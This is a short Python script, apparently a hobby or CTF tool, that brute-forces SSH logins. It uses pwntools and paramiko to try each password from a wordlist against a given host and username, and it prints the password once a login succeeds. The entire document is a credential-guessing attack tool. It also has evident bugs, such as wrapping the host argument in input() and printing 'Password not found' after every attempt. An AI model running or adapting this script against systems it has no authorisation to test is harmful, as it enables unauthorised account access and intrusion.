from pwn import *
import paramiko
import sys

host = input(sys.argv[1])
username = sys.argv[2]
attemps = 0
with open(sys.argv[3], "r") as f:
    for password in f:
        password = password.strip("\n")
        try:
            if len(sys.argv) != 4:
                print("[-] Missing arguments")
                print("How to use: python3 ssh_brute_force.py <host> <username> <password_file>")
                sys.exit(1)
            print("[{}] Trying: {}".format(attemps, password))

            response = ssh(host=host, user=username, password=password, timeout=30)
            if response.connected():
                print("[+] Password found: {}".format(password))
                response.close()
                break
                response.close()
        except paramiko.ssh_exception.AuthenticationException:
            attemps += 1
            pass
        except paramiko.ssh_exception.SSHException:
            attemps += 1
            pass
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("[-] Connection error")
            break
        except paramiko.ssh_exception.BadHostKeyException:
            print("[-] Bad host key")
            break
        finally:
            print("[+] Password not found")
